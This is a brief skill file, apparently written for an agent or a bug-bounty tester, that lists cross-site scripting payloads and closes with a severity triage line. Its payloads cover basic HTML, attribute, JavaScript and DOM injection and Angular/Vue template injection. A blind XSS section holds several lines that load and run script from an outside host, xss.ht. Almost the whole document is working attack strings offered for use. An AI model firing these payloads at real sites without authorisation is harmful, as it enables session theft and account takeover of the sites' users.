# SKILL: xss
## Payloads
HTML: <img src=x onerror=alert(1)>
Attr: "><svg onload=alert(1)>
JS: ';alert(1);//
DOM: #<img src=x onerror=alert(1)>
## Blind XSS
"><script src=https://xss.ht></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xss.ht\';document.body.appendChild(a)')
"><input onfocus=eval(atob(this.id)) id=<b64> autofocus>
"><img src=x id=<b64> onerror=eval(atob(this.id))>
<script>$.getScript("//xss.ht")</script>
{{constructor.constructor('import("https://xss.ht")')()}}
## CSTI
Angular: {{$on.constructor('alert(1)')()}}
Vue: {{constructor.constructor('alert(1)')()}}
Mavo: [7*7]
## Triage
Reflected → Low/Med. Stored → High. Stored + ATO → Critical.
